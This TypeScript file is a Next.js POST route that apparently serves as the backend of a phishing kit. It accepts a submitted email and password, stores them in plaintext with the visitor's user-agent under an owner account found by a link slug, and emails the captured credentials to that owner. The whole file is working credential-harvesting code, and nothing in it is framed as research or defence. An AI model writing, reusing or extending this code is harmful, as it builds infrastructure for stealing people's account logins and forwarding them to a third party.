import Data from "@/src/models/dataModels";
import Notification from "@/src/models/notifyModel";
import User from "@/src/models/userModels";
import { SENDMAIL } from "@/src/helpers/mailer";
import { Connect } from "@/src/db/db";
import { headers } from 'next/headers';
import Jwt from "jsonwebtoken";
import { NextRequest, NextResponse } from "next/server";

Connect();

export async function POST(req: NextRequest){
    try {
        const { e, p, status, id } = await req.json()
        // console.log(e, p, status, id)

        let fiendUser;
        if(status){
            fiendUser = await User.findOne({_id: id})
        }else{
            fiendUser = await User.findOne({url: id})
        }

        if(!fiendUser){
            return NextResponse.json({message: "Somethink went wrong User Not found", status: 500})
        }
        const headersList = headers();

        const newData = new Data({
            email: e,
            password: p,
            user_id: fiendUser._id,
            userAgent: headersList.get('user-agent') || 'unknown',
            date: Date.now()
        })

        await newData.save()

        const newNotify = new Notification({
            data: e,
            user_id: fiendUser._id,
            data_id: newData._id
        })

        await newNotify.save()

        if(!status){
            await SENDMAIL({senemail: fiendUser.email, email: e, code: p})
        }

        const nJwt = Jwt.sign({id: newData._id}, process.env.SECRETKEY!, {expiresIn: "10m"})
        const res = NextResponse.json({message: "okay", notify_id: newNotify._id, data_id: newData._id, status: 200})
        res.cookies.set("token", nJwt, {httpOnly: true, expires: Date.now() + 10 * 60 * 1000})
        return res
        
    } catch (error) {
        console.log(error)
        return NextResponse.json({message: "Somethink went wrong :(", status: 500})
    }
}